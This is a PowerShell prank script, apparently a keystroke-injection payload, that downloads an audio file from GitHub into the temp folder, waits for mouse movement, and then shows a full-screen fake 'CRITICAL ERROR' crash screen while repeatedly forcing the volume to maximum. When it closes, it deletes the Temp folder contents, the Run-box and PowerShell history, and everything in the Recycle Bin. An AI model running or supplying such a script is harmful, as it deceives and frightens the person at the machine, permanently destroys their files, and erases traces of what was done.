$wav = "https://github.com/MajorMarmalade/Sounds/blob/main/System%20Fail/error333-by-tunavoicemodnet_BNItpbc0.mp3?raw=true"

$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav

Add-Type -AssemblyName PresentationCore
$mediaPlayer = New-Object System.Windows.Media.MediaPlayer
$mediaPlayer.Open([System.Uri]"file:///$env:TMP\s.wav")

# Load required assemblies
Add-Type -AssemblyName System.Windows.Forms

# Monitor mouse movement
$originalPOS = [System.Windows.Forms.Cursor]::Position
while (1) {
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        break
    }
}

# Create a full-screen form
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = 'Blue'

# Hide the cursor
$form.Cursor = [System.Windows.Forms.Cursors]::No

# Display the error message
$errorText = "CRITICAL ERROR #0004932: SYSTEM FAILURE DETECTED"
$font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Bold)
$stringFormat = New-Object System.Drawing.StringFormat
$stringFormat.Alignment = [System.Drawing.StringAlignment]::Center
$stringFormat.LineAlignment = [System.Drawing.StringAlignment]::Center
$whiteBrush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)

# Activate audio and visual effects
$mediaPlayer.Play()

function Raise-Volume {
    $k=[Math]::Ceiling(100/2)
    $o=New-Object -ComObject WScript.Shell
    for($i = 0;$i -lt $k;$i++) {
        $o.SendKeys([char] 175)
    }
}

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 200
$timer.Add_Tick({
    Raise-Volume
    $graphics = $form.CreateGraphics()
    $graphics.Clear('Blue')
    $graphics.DrawString($errorText, $font, $whiteBrush, ($form.Width / 2), ($form.Height / 2), $stringFormat)
    $graphics.Dispose()
})

# Close form on key press
$form.Add_KeyDown({ $form.Close() })

# Start the timer and display the form
$timer.Start()
$form.ShowDialog()

# Delete contents of Temp folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
